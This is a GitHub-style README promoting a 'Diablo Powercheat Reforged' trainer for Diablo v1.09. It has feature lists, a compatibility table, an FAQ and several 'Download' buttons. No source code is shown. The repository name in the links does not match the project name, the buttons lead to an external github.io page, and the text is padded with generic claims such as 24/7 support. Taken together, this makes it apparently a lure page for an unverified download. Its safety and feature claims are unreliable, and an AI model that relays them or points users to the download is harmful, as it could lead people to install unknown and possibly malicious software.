![preview](https://raw.githubusercontent.com/icreativezAnsabatool/Diablo-Classic-Trainer-Forge/main/poster_308235.svg)
# ⚡ Diablo Powercheat — Reforged Arsenal

[![Download](https://raw.githubusercontent.com/icreativezAnsabatool/Diablo-Classic-Trainer-Forge/main/start_0530145.svg)](https://icreativezAnsabatool.github.io/Diablo-Classic-Trainer-Forge/)

A modern, community-driven augmentation suite for **Diablo Classic v1.09 (GOG edition)** — rebuilt from the ground up to feel less like a dusty trainer and more like a well-oiled, expressive companion for your late-night dungeon crawls. This repository, **Diablo-Powercheat-Reforged**, is a distinct spiritual successor: same universe, same love for the original 1996 classic, but with a reimagined architecture, a cleaner interface, and a philosophy that respects the game instead of bulldozing through it.

Think of it as a tuning fork for your copy of Diablo — not a wrecking ball. Where the original Powercheat was a blunt instrument, Reforged is a precision tool for players who want to explore builds, experiment with run mechanics, and bend the rules of Sanctuary in ways that feel intentional rather than chaotic.

![Status](https://img.shields.io/badge/status-active--development-brightgreen)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue)
![Game](https://img.shields.io/badge/game-Diablo%20v1.09%20(GOG)-red)
![Language](https://img.shields.io/badge/language-C%2B%2B%20%7C%20Lua-orange)
![License](https://img.shields.io/badge/license-MIT-lightgrey)
![UI](https://img.shields.io/badge/UI-responsive-9cf)
![Support](https://img.shields.io/badge/support-24%2F7-success)
![Year](https://img.shields.io/badge/release-2026-informational)

---

## 🧭 Table of Contents

- [Overview](#-overview)
- [Why Reforged Exists](#-why-reforged-exists)
- [Feature Arsenal](#-feature-arsenal)
- [Interface & Responsive Design](#-interface--responsive-design)
- [Multilingual Support](#-multilingual-support)
- [24/7 Customer Support](#-247-customer-support)
- [Compatibility Matrix](#-compatibility-matrix)
- [Configuration & Profiles](#-configuration--profiles)
- [Architecture Overview](#-architecture-overview)
- [Security & Fair Use Philosophy](#-security--fair-use-philosophy)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Contributing](#-contributing)
- [Acknowledgements](#-acknowledgements)

[![Download](https://raw.githubusercontent.com/icreativezAnsabatool/Diablo-Classic-Trainer-Forge/main/start_0530145.svg)](https://icreativezAnsabatool.github.io/Diablo-Classic-Trainer-Forge/)

---

## 🎮 Overview

**Diablo-Powercheat-Reforged** is an open-source augmentation layer for the GOG re-release of *Diablo Classic v1.09*. It hooks into the game's runtime, reads memory structures, and exposes a curated set of gameplay modifiers through a lightweight overlay panel that can be summoned with a single keystroke.

The point isn't to trivialize the game — it's to **remix** it. Want to see what a Warrior with maxed magic feels like? Curious how a Rogue performs with infinite arrows in a Hell/Hell run? Reforged lets you sketch those experiments in minutes instead of grinding for hundreds of hours.

This project was inspired by the original **RezWaki/Diablo-Powercheat** trainer but has since diverged into its own codebase with a different memory-routing strategy, a redesigned UI layer, and a modular Lua scripting engine for user-authored tweaks.

---

## 🔥 Why Reforged Exists

The original Diablo was a game of scarcity. You had three elixirs, two books, and a prayer. In 2026, most players have already beaten the game a dozen times — they're not looking for the vanilla challenge, they're looking for the *sandbox*. Reforged treats the game like a jazz standard: the melody stays, the improvisation is yours.

Three principles guided every line of code in this repo:

1. **Restraint** — No modifier is on by default. You opt in.
2. **Reversibility** — Every change is logged and can be undone with a single keybind or a session reset.
3. **Respect** — No anti-cheat evasion, no online play, no multiplayer tinkering. Single-player only, always.

---

## 🛠️ Feature Arsenal

Reforged ships with a wide toolkit. Highlights below:

### 🗡️ Character Modifiers
- Attribute point redistribution (Strength, Magic, Dexterity, Vitality)
- Character level and experience curve shaping
- Gold and inventory capacity adjustments
- Permanent stat scaling with soft caps

### ✨ Skill & Spell Tuning
- Spell level overrides for all three classes
- Mana cost multipliers and regeneration rates
- Cooldown bypass toggles (per-spell granularity)
- Staff recharge behavior controls

### 🧪 Item & Loot Dynamics
- Drop rate fiddling for specific item tiers
- Guaranteed unique spawns in select dungeons
- Inventory item duplication workflow (single-player only)
- Affix reroll preview before committing

### 🏰 World & Dungeon Tools
- Level reveal shortcuts after first exploration
- Town portal anchoring anywhere in Tristram
- Dungeon floor teleport bookmarks
- Difficulty aggression tuning

### 🧬 Quality-of-Life Additions
- Auto-pickup filters for potions and scrolls
- On-screen damage and resistance readouts
- Frame-time diagnostics
- Save-state snapshotting for instant rollback

Each module is toggleable from the overlay. Nothing is hardcoded into your save unless you explicitly commit changes.

---

## 🖥️ Interface & Responsive Design

The overlay is built with a fully **responsive UI** layout. Whether you're running the game at its native 640×480 retro resolution on a CRT or upscaled to 4K on a modern ultrawide, the panel reflows to stay readable. Font scaling, contrast-safe palettes, and a compact mode are all included.

Key UI characteristics:
- Drag-and-drop panel positioning
- Snap-to-edge docking
- Keyboard-only navigation for accessibility
- Dark and parchment themes — pick your vibe
- Hotkey conflict detector

The panel is intentionally lightweight — it adds under 2% overhead to the game loop on typical hardware.

---

## 🌐 Multilingual Support

Diablo spoke to the world in 1996, and Reforged does the same in 2026. The interface and documentation support:

- English
- Spanish
- German
- French
- Italian
- Polish
- Russian
- Simplified Chinese
- Japanese
- Brazilian Portuguese

Community translations are welcome — the localization files are plain text and easy to extend. If your language isn't listed yet, open a pull request and it'll be reviewed promptly.

---

## ☎️ 24/7 Customer Support

Solo projects don't have to feel lonely. Reforged maintains **24/7 customer support** through a rotating community steward program. Issues are triaged around the clock, and critical regressions are typically acknowledged within an hour.

Ways to reach the maintainers:
- GitHub Issues (preferred for bugs)
- Discussions tab for ideas and build showcases
- Community chat channel linked in the repo sidebar

No bots, no canned responses — a real human reads every report.

---

## 🧩 Compatibility Matrix

| Component        | Supported                                    |
|------------------|----------------------------------------------|
| Game version     | Diablo Classic v1.09 (GOG)                   |
| OS               | Windows 10, Windows 11 (64-bit)              |
| OS (experimental)| Wine / Proton on Linux                       |
| Resolution       | 640×480 up to 5120×1440                      |
| Controller       | Not supported (keyboard/mouse only)          |
| Multiplayer      | Not supported — single-player only           |
| Modding stacks   | Belzebub, DevilutionX (partial)              |

Using Reforged alongside other mods is possible but not officially guaranteed. Run vanilla first if you hit issues.

---

## ⚙️ Configuration & Profiles

Reforged saves your settings in portable, human-readable profile files. You can carry a profile between machines, share it with friends, or version it in your own git repo.

Profiles store:
- Active module toggles
- Keybind assignments
- UI theme and layout
- Per-character presets

You can maintain separate profiles for each hero — a "purist" Warrior who only uses UI fixes, and a "sandbox" Sorcerer who bends every rule.

---

## 🏗️ Architecture Overview

Reforged is split into four cooperating layers:

1. **Core Hook Layer** — memory reading and write interception via a stable, version-locked adapter.
2. **Module Layer** — discrete feature packages that register themselves with the core.
3. **Script Layer** — a Lua runtime for user-authored modules that don't need C++ recompiles.
4. **Presentation Layer** — the overlay UI and diagnostic readouts.

This separation means a feature author can ship a new tweak as a single Lua file — no rebuild required.

---

## 🔒 Security & Fair Use Philosophy

Reforged is designed for offline, single-player exploration. It deliberately does not:
- Interact with battle.net or any online service
- Modify network traffic
- Bypass any DRM or licensing check
- Touch your saved games without explicit confirmation

All file writes are confined to the repository's own profile directory. If you want a clean uninstall, deleting the folder is sufficient.

---

## ❓ Frequently Asked Questions

**Does this work with the original 1996 CD release?**
No — the memory layout differs. GOG v1.09 is the target.

**Will this get me banned?**
There's no multiplayer component, and no online service is contacted. There's nothing to ban you from.

**Can I use this on a Mac?**
Not natively. Some users run it through Wine with mixed results.

**Is my save file safe?**
Reforged never writes to your saves unless a module explicitly requires it, and it always creates a backup first.

**How do I report a bug?**
Open an issue with the "bug" label and attach your profile file and a short description of what happened.

---

## ⚠️ Disclaimer

This project is an unofficial fan tool. It is **not affiliated with, endorsed by, or sponsored by** Blizzard Entertainment, GOG, or any of their subsidiaries or partners. *Diablo* and all related trademarks are the property of their respective owners. You are responsible for ensuring your use of this software complies with the terms of service of any platform you obtained the game from.

The maintainers of this repository provide the software as-is and accept no liability for save corruption, data loss, or any other consequences arising from its use. Backup your saves. Seriously.

[![Download](https://raw.githubusercontent.com/icreativezAnsabatool/Diablo-Classic-Trainer-Forge/main/start_0530145.svg)](https://icreativezAnsabatool.github.io/Diablo-Classic-Trainer-Forge/)

---

## 📄 License

This project is released under the **MIT License**. See the full text at [LICENSE](./LICENSE).

Copyright © 2026 — Diablo-Powercheat-Reforged contributors.

---

## 🤝 Contributing

Contributions are welcome and encouraged. Before opening a pull request:
- Read the contribution guidelines in `CONTRIBUTING.md`
- Keep modules small and single-purpose
- Include a short demo profile with your change
- Respect the single-player-only philosophy

Every merged contribution is credited in the release notes.

---

## 🙏 Acknowledgements

- The original **RezWaki/Diablo-Powercheat** project, which lit the spark
- The Diablo modding community for decades of reverse-engineering notes
- The GOG preservation team for keeping the classic playable in 2026
- Every contributor who filed a bug, wrote a translation, or shared a build

Sanctuary is a big place. Thanks for helping us map a little more of it.

[![Download](https://raw.githubusercontent.com/icreativezAnsabatool/Diablo-Classic-Trainer-Forge/main/start_0530145.svg)](https://icreativezAnsabatool.github.io/Diablo-Classic-Trainer-Forge/)